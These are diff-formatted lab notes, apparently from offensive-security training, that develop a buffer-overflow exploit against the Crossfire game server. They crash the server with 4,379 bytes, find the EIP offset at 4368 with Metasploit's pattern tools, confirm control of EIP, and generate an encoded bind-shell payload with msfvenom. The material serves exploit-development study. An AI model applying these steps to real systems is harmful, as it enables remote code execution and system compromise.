@@ -1,0 +1,59 @@
+crossfire
+
+Preparations
+
+iptables -A INPUT -p tcp --destination-port 13327 \! -d 127.0.0.1 -j DROP && iptables -A INPUT -p tcp --destination-port 4444 \! -d 127.0.0.1 -j DROP && cd /usr/games/ && wget www.offensive-security.com/crossfire.tar.gz && tar zxpf crossfire.tar.gz
+
+
+edb --run /usr/games/crossfire/bin/crossfire
+
+01-crash.py
+
+
+
+4379 * A
+
+The debugged application encountered a segmentation fault.
+The address 0x41415264 could not be accessed.
+If you would like to pass this exception to the application press Shift+[F7/F8/F9]
+
+
+02-pattern.py
+
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4379 > /root/Desktop/pattern
+
+The debugged application encountered a segmentation fault.
+The address 0x46367046 could not be accessed.
+If you would like to pass this exception to the application press Shift+[F7/F8/F9]
+
+
+
+
+
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x46367046 -l 4379
+
+[*]Payload Sent !
+➜  crossfire-nix /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x46367046 -l 4379 
+[*] Exact match at offset 4368
+
+
+
+
+test EIP
+
+03-checking-EIP.py
+
+crash = "\x41" * 4368 + "B" * 4 + "C" * 7
+
+
+The debugged application encountered a segmentation fault.
+The address 0x42424242 could not be accessed.
+If you would like to pass this exception to the application press Shift+[F7/F8/F9]
+
+B = 42
+
+
+
+
+msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai
+
